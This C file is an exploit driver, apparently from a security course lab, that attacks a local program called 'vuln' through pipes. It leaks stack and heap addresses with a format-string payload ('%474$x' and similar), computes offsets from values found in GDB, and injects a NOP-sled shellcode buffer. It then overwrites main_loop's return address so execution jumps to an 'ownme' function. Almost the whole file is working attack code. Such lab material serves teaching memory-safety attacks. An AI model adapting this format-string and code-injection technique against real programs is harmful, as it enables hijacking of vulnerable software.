#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 1001

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfffe818;     // saved ebp for auth function
   void *mainloop_bp = 0xbfffefe8; // saved ebp for main_loop
   void *auth_ra = 0x0804899f;     // return address for auth
   void *mainloop_ra = 0x0804eb4f; // return address for main_loop

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe610;       // _value_ of user variable in auth
   void *auth_canary_loc = 0xbfffe7dc; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfffe7e8;     // location of auth's saved bp
   void *auth_ra_loc = 0xbfffe7ec;     // location of auth's return address
   void *g_authd = 0xbfffe804;
   void* ownme=0x804e6ce;  // address of ownme function
   void *g_saved_bp = 0xbfffefb8;


   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;
   unsigned ownme_mainloop_ra_diff = mainloop_ra - ownme;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_user_diff = g_authd - auth_user;
   
   unsigned main_auth_loc_diff = mainloop_bp - auth_bp_loc;
   unsigned g_mainloop_bp_diff = mainloop_bp - g_saved_bp;
  
   // difference of address of ownme call and mainloop_bp in stack
   unsigned ownme_mainloop_diff = mainloop_ra-ownme; 

    // Using the combination of u, e, p and l
  
   put_str("u xyz\n");
   send();

   unsigned cur_user_heap_address, cur_main_ebp, cur_mainloop_ra;
   put_str("e %474$x %486$x %487$x\n");
   send();
   get_formatted("%x%x%x", &cur_user_heap_address, &cur_main_ebp, &cur_mainloop_ra);


   unsigned main_loop_ra_loc = cur_main_ebp - g_mainloop_bp_diff + 4 -12;
   unsigned cur_pass_heap_loc = cur_user_heap_address -256;
  
   unsigned ownme_address = cur_mainloop_ra - ownme_mainloop_ra_diff;

   fprintf(stderr, "driver: Extracted first_hp_address=%x main_ebp=%x main_loop_ra_loc=%x ownme_address=%x\n",
    cur_user_heap_address, cur_main_ebp, main_loop_ra_loc, ownme_address);
   unsigned injected_code_address = cur_pass_heap_loc  + 56;




   put_str("p ");
   unsigned explsz = sizeof(int) + 256;
   void* *expl = (void**)malloc(explsz);
  
   expl[12]=(void*)(0x90909090);
   expl[13]=(void*)(0x90909090);
   expl[14]=(void*)(0x90909090);
   expl[15]=(void*)(0xb8909090);
   expl[16]=(void*) ownme_address;
   expl[17]=(void*)(0xd0ff9090);  
   put_bin((char*)expl, 256);

   
   void* *addr = (void**)malloc(8);
   addr[0] = (void *)injected_code_address;
   addr[1] = (void *)main_loop_ra_loc;  
   put_bin(addr,8);
   
 
   put_str("\n");
   send();  
   put_str("l \n");
   send();
   put_str("q \n");
   send();


   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
